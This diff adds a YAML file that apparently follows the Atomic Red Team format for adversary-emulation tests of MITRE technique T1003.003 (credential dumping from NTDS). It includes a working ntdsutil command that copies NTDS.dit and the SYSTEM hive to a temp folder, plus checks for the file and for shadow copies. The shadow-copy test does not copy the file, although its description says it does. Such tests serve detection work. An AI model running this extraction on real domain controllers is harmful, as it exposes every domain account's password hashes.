@@ -1,0 +1,51 @@
+attack_technique: T1003.003
+display_name: "OS Credential Dumping: NTDS"
+tactic: Credential Access
+atomic_tests:
+  - name: "NTDS.dit Access Check"
+    auto_generated_guid: e9e9f9a0b0c0d0e0f0a1b1c1d1e1f1a2
+    description: |
+      Checks if NTDS.dit database file is accessible (Domain Controller only).
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      command: |
+        $ntds = "$env:SystemRoot\NTDS\ntds.dit"
+        if (Test-Path $ntds) { Write-Output "NTDS.dit found at: $ntds"; (Get-Item $ntds).Length / 1MB | ForEach-Object { Write-Output "Size: $_ MB" } }
+        else { Write-Output "NTDS.dit not found (not a Domain Controller)" }
+      elevation_required: true
+
+  - name: "NTDS.dit Extraction via ntdsutil"
+    auto_generated_guid: f0f0a1b1c1d1e1f1a2b2c2d2e2f2a3b3
+    description: |
+      Uses ntdsutil to create an IFM (Install From Media) backup
+      which contains NTDS.dit and SYSTEM hive.
+    supported_platforms:
+      - windows
+    input_arguments:
+      output_dir:
+        description: "Output directory for IFM"
+        type: path
+        default: "C:\\Windows\\Temp\\ntds_extract"
+    executor:
+      name: command_prompt
+      command: |
+        ntdsutil "ac i ntds" "ifm" "create full #{output_dir}" q q
+      cleanup_command: |
+        rmdir /s /q #{output_dir} >nul 2>&1
+      elevation_required: true
+
+  - name: "NTDS.dit via Volume Shadow Copy"
+    auto_generated_guid: a1a1b1c1d1e1f1a2b2c2d2e2f2a3b3c3
+    description: |
+      Creates a VSS shadow copy and copies NTDS.dit from it.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      command: |
+        $shadow = (Get-WmiObject Win32_ShadowCopy -ErrorAction SilentlyContinue | Select-Object -First 1)
+        if ($shadow) { Write-Output "Shadow copy available: $($shadow.DeviceObject)" }
+        else { Write-Output "No shadow copies. Domain Controller required." }
+      elevation_required: true
